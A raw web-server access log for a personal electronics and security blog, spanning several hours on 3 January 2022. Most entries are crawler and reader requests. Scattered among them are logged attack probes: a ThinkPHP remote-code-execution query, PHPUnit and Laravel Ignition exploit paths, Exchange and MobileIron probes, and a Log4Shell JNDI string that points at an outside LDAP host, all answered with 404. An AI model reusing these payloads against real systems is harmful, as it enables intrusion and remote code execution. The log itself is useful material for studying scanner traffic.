8.29.198.27 - - [03/Jan/2022:18:10:57 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
17.121.113.221 - - [03/Jan/2022:18:12:49 +0000] "GET /blog/2016/11/12/2016_Road_Trip_Photos.html HTTP/1.1" 200 2755
45.146.165.37 - - [03/Jan/2022:18:17:07 +0000] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 207
8.29.198.25 - - [03/Jan/2022:18:18:22 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
92.247.181.9 - - [03/Jan/2022:18:20:16 +0000] "GET /blog/atom.xml HTTP/1.1" 200 1063499
216.244.66.232 - - [03/Jan/2022:18:21:42 +0000] "GET /blog/tags/Interrupt.html HTTP/1.1" 200 819
114.119.129.148 - - [03/Jan/2022:18:22:40 +0000] "GET /blog/tags/gpl.html HTTP/1.1" 200 575
66.249.66.208 - - [03/Jan/2022:18:24:21 +0000] "GET /blog/tags/Debian.html HTTP/1.1" 200 1320
8.29.198.27 - - [03/Jan/2022:18:25:40 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
157.55.39.182 - - [03/Jan/2022:18:26:32 +0000] "GET /blog/2015/1/24/Selecting_a_Slowcooker.html HTTP/1.1" 200 2927
8.29.198.25 - - [03/Jan/2022:18:32:49 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
45.155.126.3 - - [03/Jan/2022:18:33:14 +0000] "-" 408 -
66.249.66.210 - - [03/Jan/2022:18:34:52 +0000] "GET / HTTP/1.1" 200 97
66.249.66.89 - - [03/Jan/2022:18:34:53 +0000] "GET /blog/ HTTP/1.1" 200 91741
54.36.148.109 - - [03/Jan/2022:18:37:03 +0000] "GET /blog/2015/8/29/AntennaCraft_Television_Antenna_Teardown.html HTTP/1.1" 200 5197
157.90.209.81 - - [03/Jan/2022:18:37:09 +0000] "GET /robots.txt HTTP/1.1" 404 208
8.29.198.25 - - [03/Jan/2022:18:40:00 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
97.107.141.188 - - [03/Jan/2022:18:41:18 +0000] "GET /blog/atom.xml HTTP/1.1" 200 1063499
185.191.171.10 - - [03/Jan/2022:18:44:01 +0000] "GET /blog/2011/1/28/Opening_and_Getting_Console_on_AT&T_U-Verse__3800HGV-B.html HTTP/1.1" 200 4429
8.29.198.25 - - [03/Jan/2022:18:47:12 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
114.119.129.113 - - [03/Jan/2022:18:50:25 +0000] "GET /blog/tags/audio.html HTTP/1.1" 200 816
8.29.198.25 - - [03/Jan/2022:18:54:31 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
114.119.129.115 - - [03/Jan/2022:18:57:53 +0000] "GET /blog/tags/sprint.html HTTP/1.1" 200 566
8.29.198.25 - - [03/Jan/2022:19:01:39 +0000] "GET /blog/atom.xml HTTP/1.1" 200 1063499
40.77.167.26 - - [03/Jan/2022:19:02:29 +0000] "GET / HTTP/1.1" 200 97
54.36.148.109 - - [03/Jan/2022:19:05:32 +0000] "GET /blog/2012/1/2/Retraction:_BSidesKC_Samsung_Presentation.html HTTP/1.1" 404 258
66.102.6.127 - - [03/Jan/2022:19:07:33 +0000] "GET / HTTP/1.1" 200 97
66.102.6.125 - - [03/Jan/2022:19:07:34 +0000] "GET /blog/ HTTP/1.1" 200 91741
66.102.6.98 - - [03/Jan/2022:19:07:34 +0000] "GET /favicon.ico HTTP/1.1" 404 209
185.191.171.23 - - [03/Jan/2022:19:08:22 +0000] "GET /blog/tags/AT&T.html HTTP/1.1" 200 795
8.29.198.26 - - [03/Jan/2022:19:08:57 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
77.99.126.18 - - [03/Jan/2022:19:12:51 +0000] "GET /blog/2016/12/6/Scanning_for_mobile_devices_running_Netflix.html HTTP/1.1" 200 3607
77.99.126.18 - - [03/Jan/2022:19:12:51 +0000] "GET /blog/css/blog.css HTTP/1.1" 200 318
77.99.126.18 - - [03/Jan/2022:19:12:52 +0000] "GET /favicon.ico HTTP/1.1" 404 209
66.249.66.130 - - [03/Jan/2022:19:12:55 +0000] "GET /blog/tags/Obfuscation.html HTTP/1.1" 200 599
207.46.13.158 - - [03/Jan/2022:19:15:34 +0000] "GET /blog/tags/CRC32.html HTTP/1.1" 200 589
8.29.198.25 - - [03/Jan/2022:19:16:07 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
189.142.113.179 - - [03/Jan/2022:19:17:23 +0000] "GET /blog/2019/10/18/Ethereum_Mining_on_Raspberry_Pi_4.html HTTP/1.1" 200 2236
189.142.113.179 - - [03/Jan/2022:19:17:24 +0000] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 238
189.142.113.179 - - [03/Jan/2022:19:17:25 +0000] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 226
189.142.113.179 - - [03/Jan/2022:19:17:25 +0000] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 230
189.142.113.179 - - [03/Jan/2022:19:17:25 +0000] "GET /apple-touch-icon.png HTTP/1.1" 404 218
189.142.113.179 - - [03/Jan/2022:19:17:26 +0000] "GET /favicon.ico HTTP/1.1" 404 209
189.142.113.179 - - [03/Jan/2022:19:17:26 +0000] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 238
189.142.113.179 - - [03/Jan/2022:19:17:26 +0000] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 226
189.142.113.179 - - [03/Jan/2022:19:17:26 +0000] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 230
189.142.113.179 - - [03/Jan/2022:19:17:27 +0000] "GET /apple-touch-icon.png HTTP/1.1" 404 218
189.142.113.179 - - [03/Jan/2022:19:17:27 +0000] "GET /favicon.ico HTTP/1.1" 404 209
185.191.171.25 - - [03/Jan/2022:19:18:24 +0000] "GET /robots.txt HTTP/1.1" 404 208
185.191.171.38 - - [03/Jan/2022:19:18:24 +0000] "GET /blog/2011/10/11/_Robot_Cupcakes.html HTTP/1.1" 200 1718
17.121.115.162 - - [03/Jan/2022:19:20:26 +0000] "GET /robots.txt HTTP/1.1" 404 208
17.121.115.162 - - [03/Jan/2022:19:20:26 +0000] "GET /blog/tags/Wiper.html HTTP/1.1" 200 566
92.247.181.9 - - [03/Jan/2022:19:21:53 +0000] "GET /blog/atom.xml HTTP/1.1" 200 1063499
8.29.198.25 - - [03/Jan/2022:19:23:12 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
174.72.181.35 - - [03/Jan/2022:19:24:43 +0000] "GET /blog/2020/12/20/2002_Toyota_Highlander_Positive_Battery_Terminal_Interface.html HTTP/1.1" 200 4101
174.72.181.35 - - [03/Jan/2022:19:24:43 +0000] "GET /blog/css/blog.css HTTP/1.1" 200 318
174.72.181.35 - - [03/Jan/2022:19:24:44 +0000] "GET /favicon.ico HTTP/1.1" 404 209
64.227.171.39 - - [03/Jan/2022:19:25:00 +0000] "GET / HTTP/1.0" 400 362
174.72.181.35 - - [03/Jan/2022:19:25:04 +0000] "-" 408 -
114.119.129.143 - - [03/Jan/2022:19:26:15 +0000] "GET /blog/2019/8/3/Adventures_in_Geocoding_the_FCC_ULS_Database_On_the_Cheap.html HTTP/1.1" 200 5780
8.29.198.26 - - [03/Jan/2022:19:30:37 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
114.119.129.147 - - [03/Jan/2022:19:31:45 +0000] "GET /blog/tags/ubuntu.html HTTP/1.1" 200 506
54.36.148.109 - - [03/Jan/2022:19:33:23 +0000] "GET /blog/tags/Sorting%20algorithm.html HTTP/1.1" 200 603
66.249.66.132 - - [03/Jan/2022:19:33:56 +0000] "GET /blog/2013/7/20/ActionTec_MegaPlug_Teardown.html HTTP/1.1" 200 6019
193.118.53.210 - - [03/Jan/2022:19:37:08 +0000] "GET /solr/ HTTP/1.1" 404 203
114.119.129.128 - - [03/Jan/2022:19:37:12 +0000] "GET /blog/2016/1/4/IDA_on_64-bit_Debian_Dependencies.html HTTP/1.1" 200 1622
8.29.198.27 - - [03/Jan/2022:19:37:50 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
50.116.54.8 - - [03/Jan/2022:19:41:17 +0000] "GET /blog/atom.xml HTTP/1.1" 200 1063499
114.119.129.148 - - [03/Jan/2022:19:43:07 +0000] "GET /blog/2017/1/5/MadSax.html HTTP/1.1" 200 4540
114.119.143.247 - - [03/Jan/2022:19:43:30 +0000] "GET /robots.txt HTTP/1.1" 404 208
45.146.165.37 - - [03/Jan/2022:19:43:36 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 248
8.29.198.27 - - [03/Jan/2022:19:45:02 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
128.14.133.58 - - [03/Jan/2022:19:49:15 +0000] "GET /solr/ HTTP/1.1" 404 203
114.119.129.128 - - [03/Jan/2022:19:49:43 +0000] "GET /blog/tags/ThinkPad.html HTTP/1.1" 200 856
8.29.198.25 - - [03/Jan/2022:19:52:07 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
114.119.129.143 - - [03/Jan/2022:19:55:23 +0000] "GET /blog/tags/Sorting%20algorithm.html HTTP/1.1" 200 603
8.29.198.25 - - [03/Jan/2022:19:59:14 +0000] "GET /blog/atom.xml HTTP/1.1" 200 1063499
114.119.129.148 - - [03/Jan/2022:20:01:00 +0000] "GET /blog/tags/Mutual%20exclusion.html HTTP/1.1" 200 597
185.191.171.9 - - [03/Jan/2022:20:01:05 +0000] "GET /blog/tags/bike.html HTTP/1.1" 200 566
54.36.148.109 - - [03/Jan/2022:20:04:10 +0000] "GET /blog/2018/3/31/Toymail_Talkie_Network_Services.html HTTP/1.1" 200 6169
66.249.66.132 - - [03/Jan/2022:20:05:27 +0000] "GET /blog/2020/12/31/Detecting_changes_to_kernel_registers_LinuxMIPS.html HTTP/1.1" 200 2126
8.29.198.26 - - [03/Jan/2022:20:06:24 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
114.119.129.147 - - [03/Jan/2022:20:06:31 +0000] "GET /blog/tags/APRS.html HTTP/1.1" 200 546
130.211.54.158 - - [03/Jan/2022:20:07:53 +0000] "GET / HTTP/1.1" 200 97
66.249.66.12 - - [03/Jan/2022:20:07:54 +0000] "GET /blog/tags/MadSax.html HTTP/1.1" 200 497
66.249.66.74 - - [03/Jan/2022:20:07:55 +0000] "GET /blog/2011/9/16/Kansas_City_Mini_Maker_Faire_Parkville_photos_are_up.html HTTP/1.1" 200 1633
66.249.66.130 - - [03/Jan/2022:20:07:55 +0000] "GET /blog/tags/Design.html HTTP/1.1" 200 597
66.249.66.88 - - [03/Jan/2022:20:08:32 +0000] "GET /blog/tags/Teller.html HTTP/1.1" 200 542
114.119.129.143 - - [03/Jan/2022:20:12:42 +0000] "GET /blog/tags/Mass%20storage.html HTTP/1.1" 200 564
8.29.198.27 - - [03/Jan/2022:20:13:34 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
186.4.22.196 - - [03/Jan/2022:20:13:51 +0000] "GET /blog/2019/10/18/Ethereum_Mining_on_Raspberry_Pi_4.html HTTP/1.1" 200 2236
186.4.22.196 - - [03/Jan/2022:20:13:52 +0000] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 230
186.4.22.196 - - [03/Jan/2022:20:13:52 +0000] "GET /favicon.ico HTTP/1.1" 404 209
186.4.22.196 - - [03/Jan/2022:20:13:52 +0000] "GET /apple-touch-icon.png HTTP/1.1" 404 218
93.184.64.34 - - [03/Jan/2022:20:15:46 +0000] "GET /blog/2021/7/15/Installing_Magisk_on_Raspberry_Pi_4_OmniROM_Android_11.html HTTP/1.1" 200 5974
93.184.64.34 - - [03/Jan/2022:20:15:46 +0000] "GET /blog/css/blog.css HTTP/1.1" 200 318
93.184.64.34 - - [03/Jan/2022:20:15:46 +0000] "GET /favicon.ico HTTP/1.1" 404 209
66.249.66.132 - - [03/Jan/2022:20:15:58 +0000] "GET /blog/2012/9/2/Hooking_ARM_IRQs_with_FIQs.html HTTP/1.1" 200 3953
93.184.64.34 - - [03/Jan/2022:20:17:26 +0000] "-" 408 -
93.184.64.34 - - [03/Jan/2022:20:17:26 +0000] "-" 408 -
114.119.129.14 - - [03/Jan/2022:20:18:10 +0000] "GET /blog/2011/2/5/Verizon__Samsung_SCS-2U01_Port_Scan.html HTTP/1.1" 200 1710
8.29.198.27 - - [03/Jan/2022:20:20:46 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
157.55.39.88 - - [03/Jan/2022:20:21:53 +0000] "GET /datasheets/st/3303.pdf HTTP/1.1" 404 220
17.121.115.182 - - [03/Jan/2022:20:21:55 +0000] "GET /blog/2019/3/23/Opening_Your_Sprint_Magic_Box.html HTTP/1.1" 200 2445
35.201.236.91 - - [03/Jan/2022:20:22:04 +0000] "GET /_ignition/execute-solution HTTP/1.1" 404 224
35.201.236.91 - - [03/Jan/2022:20:22:15 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 248
35.201.236.91 - - [03/Jan/2022:20:22:36 +0000] "GET /login HTTP/1.1" 404 203
92.247.181.9 - - [03/Jan/2022:20:23:13 +0000] "GET /blog/atom.xml HTTP/1.1" 200 1063499
35.201.236.91 - - [03/Jan/2022:20:23:16 +0000] "GET /manager/html HTTP/1.1" 404 210
35.201.236.91 - - [03/Jan/2022:20:23:28 +0000] "GET /wp-login.php HTTP/1.1" 404 210
35.201.236.91 - - [03/Jan/2022:20:23:28 +0000] "-" 408 -
114.119.129.14 - - [03/Jan/2022:20:24:01 +0000] "GET /blog/2011/9/29/More_Remote_Shutters.html HTTP/1.1" 200 2310
35.201.236.91 - - [03/Jan/2022:20:24:20 +0000] "-" 408 -
8.29.198.26 - - [03/Jan/2022:20:27:51 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
114.119.129.128 - - [03/Jan/2022:20:29:53 +0000] "GET /blog/tags/RLE.html HTTP/1.1" 200 555
67.168.102.56 - - [03/Jan/2022:20:30:44 +0000] "GET /blog/2015/12/14/GreaseGun_Valve_Teardown.html HTTP/1.1" 200 5805
67.168.102.56 - - [03/Jan/2022:20:30:44 +0000] "GET /blog/css/blog.css HTTP/1.1" 200 318
67.168.102.56 - - [03/Jan/2022:20:30:44 +0000] "GET /favicon.ico HTTP/1.1" 404 209
67.168.102.56 - - [03/Jan/2022:20:31:06 +0000] "-" 408 -
67.168.102.56 - - [03/Jan/2022:20:32:06 +0000] "-" 408 -
67.168.102.56 - - [03/Jan/2022:20:32:06 +0000] "-" 408 -
23.224.42.11 - - [03/Jan/2022:20:32:10 +0000] "GET / HTTP/1.1" 200 97
67.168.102.56 - - [03/Jan/2022:20:33:06 +0000] "-" 408 -
67.168.102.56 - - [03/Jan/2022:20:33:06 +0000] "-" 408 -
51.222.253.20 - - [03/Jan/2022:20:34:04 +0000] "GET /robots.txt HTTP/1.1" 404 208
54.36.148.109 - - [03/Jan/2022:20:34:05 +0000] "GET /blog/tags/Data%20type.html HTTP/1.1" 200 587
67.168.102.56 - - [03/Jan/2022:20:34:30 +0000] "-" 408 -
67.168.102.56 - - [03/Jan/2022:20:34:30 +0000] "-" 408 -
8.29.198.26 - - [03/Jan/2022:20:35:00 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
67.168.102.56 - - [03/Jan/2022:20:35:30 +0000] "-" 408 -
67.168.102.56 - - [03/Jan/2022:20:35:30 +0000] "-" 408 -
67.168.102.56 - - [03/Jan/2022:20:38:08 +0000] "-" 408 -
67.168.102.56 - - [03/Jan/2022:20:38:08 +0000] "-" 408 -
97.107.141.188 - - [03/Jan/2022:20:41:17 +0000] "GET /blog/atom.xml HTTP/1.1" 200 1063499
8.29.198.27 - - [03/Jan/2022:20:42:15 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
185.191.171.34 - - [03/Jan/2022:20:48:07 +0000] "GET /robots.txt HTTP/1.1" 404 208
185.191.171.22 - - [03/Jan/2022:20:48:07 +0000] "GET /blog/tags/board%20game.html HTTP/1.1" 200 542
54.36.148.109 - - [03/Jan/2022:20:48:20 +0000] "GET /blog/tags/Synchronous%20Serial.html HTTP/1.1" 200 595
167.94.138.60 - - [03/Jan/2022:20:49:03 +0000] "GET / HTTP/1.1" 200 97
167.94.138.60 - - [03/Jan/2022:20:49:03 +0000] "GET / HTTP/1.1" 200 97
8.29.198.25 - - [03/Jan/2022:20:49:22 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
67.168.102.56 - - [03/Jan/2022:20:49:30 +0000] "-" 408 -
67.168.102.56 - - [03/Jan/2022:20:49:30 +0000] "-" 408 -
114.119.129.147 - - [03/Jan/2022:20:49:44 +0000] "GET /blog/tags/Cricut.html HTTP/1.1" 200 644
114.119.130.151 - - [03/Jan/2022:20:51:08 +0000] "GET /robots.txt HTTP/1.1" 404 208
66.249.66.132 - - [03/Jan/2022:20:51:41 +0000] "GET /robots.txt HTTP/1.1" 404 208
66.249.66.132 - - [03/Jan/2022:20:51:41 +0000] "GET /blog/tags/Peltier.html HTTP/1.1" 200 792
67.168.102.56 - - [03/Jan/2022:20:54:01 +0000] "-" 408 -
67.168.102.56 - - [03/Jan/2022:20:54:01 +0000] "-" 408 -
8.29.198.25 - - [03/Jan/2022:20:56:35 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
17.121.113.91 - - [03/Jan/2022:20:56:44 +0000] "GET /blog/tags/Antenna.html HTTP/1.1" 200 828
82.114.45.72 - - [03/Jan/2022:21:01:01 +0000] "GET /blog/2015/4/19/WiFi_Yagi_SWR_Shootout.html HTTP/1.1" 200 12116
82.114.45.72 - - [03/Jan/2022:21:01:02 +0000] "GET /blog/css/blog.css HTTP/1.1" 200 318
82.114.45.72 - - [03/Jan/2022:21:01:04 +0000] "GET /favicon.ico HTTP/1.1" 404 209
45.146.165.37 - - [03/Jan/2022:21:01:29 +0000] "POST /mifs/.;/services/LogService HTTP/1.1" 404 225
8.29.198.26 - - [03/Jan/2022:21:03:42 +0000] "GET /blog/atom.xml HTTP/1.1" 200 1063499
76.217.43.74 - - [03/Jan/2022:21:04:54 +0000] "GET /blog/2017/2/20/A_Simple_Ticketmaster_Hack.html HTTP/1.1" 200 4748
76.217.43.74 - - [03/Jan/2022:21:04:54 +0000] "GET /blog/css/blog.css HTTP/1.1" 200 318
76.217.43.74 - - [03/Jan/2022:21:04:54 +0000] "GET /favicon.ico HTTP/1.1" 404 209
17.121.115.101 - - [03/Jan/2022:21:10:24 +0000] "GET /blog/2009/12/24/My_HP_311_came_in_the_mail_today!.html HTTP/1.1" 200 6812
8.29.198.26 - - [03/Jan/2022:21:10:59 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
175.6.210.66 - - [03/Jan/2022:21:14:44 +0000] "GET /${jndi:ldap://121.140.99.236:1389/Exploit} HTTP/1.1" 404 240
175.6.210.66 - - [03/Jan/2022:21:14:45 +0000] "GET / HTTP/1.1" 200 97
175.6.210.66 - - [03/Jan/2022:21:14:46 +0000] "GET / HTTP/1.1" 200 97
8.29.198.25 - - [03/Jan/2022:21:18:21 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
76.169.164.32 - - [03/Jan/2022:21:18:37 +0000] "-" 408 -
76.169.164.32 - - [03/Jan/2022:21:18:37 +0000] "-" 408 -
76.169.164.32 - - [03/Jan/2022:21:19:36 +0000] "-" 408 -
76.169.164.32 - - [03/Jan/2022:21:19:37 +0000] "-" 408 -
76.169.164.32 - - [03/Jan/2022:21:20:37 +0000] "-" 408 -
76.169.164.32 - - [03/Jan/2022:21:20:37 +0000] "-" 408 -
76.169.164.32 - - [03/Jan/2022:21:21:37 +0000] "-" 408 -
76.169.164.32 - - [03/Jan/2022:21:21:37 +0000] "-" 408 -
76.169.164.32 - - [03/Jan/2022:21:22:37 +0000] "-" 408 -
76.169.164.32 - - [03/Jan/2022:21:22:37 +0000] "-" 408 -
92.247.181.9 - - [03/Jan/2022:21:24:07 +0000] "GET /blog/atom.xml HTTP/1.1" 200 1063499
76.169.164.32 - - [03/Jan/2022:21:24:08 +0000] "GET /blog/2017/10/26/Reviving_an_old_Seiko_TT4000SC.html HTTP/1.1" 200 3058
76.169.164.32 - - [03/Jan/2022:21:24:29 +0000] "-" 408 -
114.119.129.143 - - [03/Jan/2022:21:25:04 +0000] "GET /blog/2008/6/10/JAUS_a_testament_to_poor_design_and_early_adoption.html HTTP/1.1" 200 6524
76.169.164.32 - - [03/Jan/2022:21:25:35 +0000] "-" 408 -
76.169.164.32 - - [03/Jan/2022:21:25:35 +0000] "-" 408 -
8.29.198.26 - - [03/Jan/2022:21:25:35 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
37.46.248.5 - - [03/Jan/2022:21:26:24 +0000] "GET / HTTP/1.1" 200 97
76.169.164.32 - - [03/Jan/2022:21:26:35 +0000] "-" 408 -
76.169.164.32 - - [03/Jan/2022:21:26:35 +0000] "-" 408 -
185.191.171.17 - - [03/Jan/2022:21:26:42 +0000] "GET /blog/2011/2/4/Sprint__Samsung_AIRAVE_Photos_Up.html HTTP/1.1" 200 1651
76.169.164.32 - - [03/Jan/2022:21:26:44 +0000] "GET /blog/2017/10/26/Critical_Mass_Cotcha.html HTTP/1.1" 200 2270
76.169.164.32 - - [03/Jan/2022:21:27:05 +0000] "-" 408 -
76.169.164.32 - - [03/Jan/2022:21:27:24 +0000] "-" 408 -
76.169.164.32 - - [03/Jan/2022:21:27:28 +0000] "-" 408 -
185.191.171.45 - - [03/Jan/2022:21:28:20 +0000] "GET /blog/tags/Ham%20Radio.html HTTP/1.1" 200 1900
114.119.129.148 - - [03/Jan/2022:21:30:41 +0000] "GET /blog/tags/SecKC.html HTTP/1.1" 200 643
8.29.198.27 - - [03/Jan/2022:21:32:49 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
192.241.195.166 - - [03/Jan/2022:21:35:15 +0000] "GET /owa/auth/x.js HTTP/1.1" 404 211
54.36.148.109 - - [03/Jan/2022:21:36:14 +0000] "GET /blog/2017/10/15/Binary_Multiplication_Tricks.html HTTP/1.1" 200 8112
114.119.129.14 - - [03/Jan/2022:21:36:19 +0000] "GET /blog/tags/AMD64.html HTTP/1.1" 200 549
198.199.95.200 - - [03/Jan/2022:21:36:55 +0000] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 404 273
8.29.198.25 - - [03/Jan/2022:21:40:08 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
66.249.66.89 - - [03/Jan/2022:21:41:01 +0000] "GET /blog/2020/10/26/Google_Fiber_Partial_Jack_Bypass.html HTTP/1.1" 200 8200
66.249.66.206 - - [03/Jan/2022:21:41:02 +0000] "GET /blog/2020/10/26/Google_Fiber_Partial_Jack_Bypass.html HTTP/1.1" 200 8200
66.249.66.132 - - [03/Jan/2022:21:41:04 +0000] "GET /blog/2020/11/21/Right_to_Left_Computability.html HTTP/1.1" 200 14830
66.249.66.130 - - [03/Jan/2022:21:41:05 +0000] "GET /blog/2020/11/21/Right_to_Left_Computability.html HTTP/1.1" 200 14830
45.79.148.82 - - [03/Jan/2022:21:41:17 +0000] "GET /blog/atom.xml HTTP/1.1" 200 1063499
192.241.212.44 - - [03/Jan/2022:21:44:31 +0000] "GET /owa/auth/logon.aspx HTTP/1.1" 404 217
8.29.198.27 - - [03/Jan/2022:21:47:11 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
189.4.77.146 - - [03/Jan/2022:21:52:29 +0000] "GET /blog/2021/7/15/Installing_Magisk_on_Raspberry_Pi_4_OmniROM_Android_11.html HTTP/1.1" 200 5974
189.4.77.146 - - [03/Jan/2022:21:52:29 +0000] "GET /blog/css/blog.css HTTP/1.1" 200 318
189.4.77.146 - - [03/Jan/2022:21:52:29 +0000] "GET /favicon.ico HTTP/1.1" 404 209
17.121.113.5 - - [03/Jan/2022:21:52:40 +0000] "GET / HTTP/1.1" 200 97
17.121.113.5 - - [03/Jan/2022:21:52:40 +0000] "GET /blog/ HTTP/1.1" 200 91741
189.4.77.146 - - [03/Jan/2022:21:52:50 +0000] "-" 408 -
114.119.129.113 - - [03/Jan/2022:21:53:39 +0000] "GET /blog/tags/SLR.html HTTP/1.1" 200 648
8.29.198.25 - - [03/Jan/2022:21:54:29 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
94.15.144.99 - - [03/Jan/2022:21:59:05 +0000] "GET /blog/2017/2/20/A_Simple_Ticketmaster_Hack.html HTTP/1.1" 200 4748
94.15.144.99 - - [03/Jan/2022:21:59:05 +0000] "GET /blog/css/blog.css HTTP/1.1" 200 318
94.15.144.99 - - [03/Jan/2022:21:59:05 +0000] "GET /favicon.ico HTTP/1.1" 404 209
114.119.129.113 - - [03/Jan/2022:21:59:15 +0000] "GET /blog/tags/Turing%20completeness.html HTTP/1.1" 200 623
103.131.71.82 - - [03/Jan/2022:21:59:51 +0000] "GET /robots.txt HTTP/1.1" 404 208
103.131.71.136 - - [03/Jan/2022:21:59:52 +0000] "GET /blog/2011/3/13/One_little,_two_little,_three_little_endians.html HTTP/1.1" 200 7791
8.29.198.26 - - [03/Jan/2022:22:01:39 +0000] "GET /blog/atom.xml HTTP/1.1" 200 1063499
189.4.77.146 - - [03/Jan/2022:22:02:36 +0000] "GET /blog/2021/7/15/Installing_Magisk_on_Raspberry_Pi_4_OmniROM_Android_11.html HTTP/1.1" 200 5974
189.4.77.146 - - [03/Jan/2022:22:02:57 +0000] "-" 408 -
189.4.77.146 - - [03/Jan/2022:22:02:57 +0000] "-" 408 -
114.119.129.147 - - [03/Jan/2022:22:04:54 +0000] "GET /blog/2018/8/3/Marsaglias_XORSHIFT32_in_PSIMD.html HTTP/1.1" 200 3633
8.29.198.25 - - [03/Jan/2022:22:08:45 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
114.119.139.104 - - [03/Jan/2022:22:10:22 +0000] "GET /robots.txt HTTP/1.1" 404 208
112.92.87.246 - - [03/Jan/2022:22:14:48 +0000] "GET / HTTP/1.1" 200 97
45.146.165.37 - - [03/Jan/2022:22:15:09 +0000] "GET /_ignition/execute-solution HTTP/1.1" 404 224
157.55.39.182 - - [03/Jan/2022:22:15:33 +0000] "GET /blog/2011/8/13/Bike_Camping_at_Middle_Creek_Lake_and_Park.html HTTP/1.1" 200 5836
8.29.198.27 - - [03/Jan/2022:22:15:53 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
114.119.129.147 - - [03/Jan/2022:22:15:57 +0000] "GET /blog/tags/Video.html HTTP/1.1" 200 1255
114.119.129.113 - - [03/Jan/2022:22:21:43 +0000] "GET /blog/tags/CpE315.html HTTP/1.1" 200 554
96.28.233.55 - - [03/Jan/2022:22:22:08 +0000] "GET /blog/2017/2/20/A_Simple_Ticketmaster_Hack.html HTTP/1.1" 200 4748
96.28.233.55 - - [03/Jan/2022:22:22:09 +0000] "GET /blog/css/blog.css HTTP/1.1" 200 318
96.28.233.55 - - [03/Jan/2022:22:22:09 +0000] "GET /favicon.ico HTTP/1.1" 404 209
220.181.108.140 - - [03/Jan/2022:22:22:57 +0000] "GET /blog/2011/2/3/You_stay_away_from_here!.html HTTP/1.1" 200 2263
220.181.51.114 - - [03/Jan/2022:22:22:58 +0000] "GET /robots.txt HTTP/1.1" 404 208
8.29.198.26 - - [03/Jan/2022:22:23:01 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
92.247.181.9 - - [03/Jan/2022:22:25:03 +0000] "GET /blog/atom.xml HTTP/1.1" 200 1063499
66.249.66.8 - - [03/Jan/2022:22:26:42 +0000] "GET /blog/tags/AA-170.html HTTP/1.1" 200 580
54.36.148.109 - - [03/Jan/2022:22:28:06 +0000] "GET /blog/2020/7/3/Installing_Debian_10_on_a_PowerMac_G5.html HTTP/1.1" 200 9036
5.161.66.108 - - [03/Jan/2022:22:29:43 +0000] "GET /blog/2010/10/7/libcutterCricut_SVG_Support.html HTTP/1.1" 200 2274
8.29.198.26 - - [03/Jan/2022:22:30:10 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
17.121.113.139 - - [03/Jan/2022:22:30:39 +0000] "GET /blog/2021/1/18/Rudimentary_curve_tracing_with_a_programmable_power_supply.html HTTP/1.1" 200 9860
66.249.66.72 - - [03/Jan/2022:22:33:46 +0000] "GET /blog/2008/6/10/JAUS_a_testament_to_poor_design_and_early_adoption.html HTTP/1.1" 200 6524
192.31.242.67 - - [03/Jan/2022:22:36:33 +0000] "GET /blog/2016/2/7/Graphical_Analysis_of_Collision_Rates_of_Various_CRCs.html HTTP/1.1" 200 6691
192.31.242.67 - - [03/Jan/2022:22:36:33 +0000] "GET /blog/css/blog.css HTTP/1.1" 200 318
192.31.242.67 - - [03/Jan/2022:22:36:34 +0000] "GET /favicon.ico HTTP/1.1" 404 209
8.29.198.26 - - [03/Jan/2022:22:37:14 +0000] "GET /blog/atom.xml HTTP/1.1" 304 -
173.163.101.37 - - [03/Jan/2022:22:38:48 +0000] "GET /blog/2015/3/31/Vizio_Remote_Teardown.html HTTP/1.1" 200 3132
173.163.101.37 - - [03/Jan/2022:22:38:48 +0000] "GET /blog/css/blog.css HTTP/1.1" 200 318
173.163.101.37 - - [03/Jan/2022:22:38:49 +0000] "GET /favicon.ico HTTP/1.1" 404 209
84.78.158.244 - - [03/Jan/2022:22:40:37 +0000] "GET /blog/2020/7/3/Installing_Debian_10_on_a_PowerMac_G5.html HTTP/1.1" 200 9036
84.78.158.244 - - [03/Jan/2022:22:40:37 +0000] "GET /blog/css/blog.css HTTP/1.1" 200 318
